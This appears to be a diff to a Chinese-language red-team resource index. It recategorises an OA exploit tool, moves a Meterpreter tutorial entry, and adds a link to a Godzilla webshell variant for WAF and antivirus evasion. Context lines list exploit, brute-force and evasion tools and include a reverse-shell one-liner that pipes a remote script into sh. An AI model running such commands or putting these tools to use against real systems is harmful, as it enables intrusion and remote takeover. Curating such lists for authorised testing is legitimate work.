@@ -245,7 +245,6 @@
  - [**[Tool]** 长亭的扫描器 Xray](https://github.com/chaitin/xray)   
  - [**[Tool]** Vulmap](https://github.com/zhzyker/vulmap)   
  - [**[Tool]** 红队综合渗透框架SatanSword@Lucifer1993](https://github.com/Lucifer1993/SatanSword)
- - [**[Tool]** 国内OA系统漏洞检测](https://github.com/LittleBear4/OA-EXPTOOL)
 ##### 4.2.1.2 被动式
 >将Burpusuite打造成一个被动式扫描器   
 - [**[Tool]** BurpSutie 插件集合@Mr-xn](https://github.com/Mr-xn/BurpSuite-collections)  
@@ -258,6 +257,7 @@
 - [红队中易被攻击的一些重点系统漏洞整理@r0eXpeR](https://github.com/r0eXpeR/redteam_vul)
 - [织梦全版本漏洞扫描@lengjibo](https://github.com/lengjibo/dedecmscan)
 ##### 4.2.2.2 漏洞利用工具
+- [**[Tool]** 国内OA系统漏洞检测](https://github.com/LittleBear4/OA-EXPTOOL)
 - [**[Tool]** Struts2漏洞扫描&利用](https://github.com/HatBoy/Struts2-Scan)
 - [**[Tool]** shiro反序列化漏洞利用](https://github.com/wyzxxz/shiro_rce_tool)
 - [**[Tool]** EBurstGo Exchange 服务器 Web 接口爆破邮箱账户](https://github.com/X1r0z/EBurstGo)
@@ -309,8 +309,9 @@
 
 ### 4.4 权限维持&后门
 #### 4.4.1 通用
-- [Meterpreter of Metasploit 使用教程](./penetration/PEN-MSF.md)
 > backdoor生成，meterpreter操作指令
+- [Meterpreter of Metasploit 使用教程](./penetration/PEN-MSF.md)
+
 #### 4.4.2 Shell会话
 - [反弹/正向 Shell & 升级交互式Shell (Linux&Win)](./penetration/PEN-ReShell.md)   
 > curl https://reverse-shell.sh/192.168.0.69:1337 | sh
@@ -340,6 +341,8 @@
 - [**[Tool]** 冰蝎WebShell免杀生成@Tas9er](https://github.com/Tas9er/ByPassBehinder)
 - [**[Tool]** 免杀webshell生成集合工具@cseroad](https://github.com/cseroad/Webshell_Generate)
 - [**[Tool]** XG拟态-Webshell静态免杀+流量逃逸@xiaogang000](https://github.com/xiaogang000/XG_NTAI)
+- [**[Tool]** 哥斯拉二次开发-WAF逃逸+免杀@kong030813](https://github.com/kong030813/Z-Godzilla_ekp)
+- 
 ### 4.6 隧道&代理
 #### 4.6.1 TCP隧道
 - [SSH 端口转发&开socks5](./penetration/PEN-ssh.md)
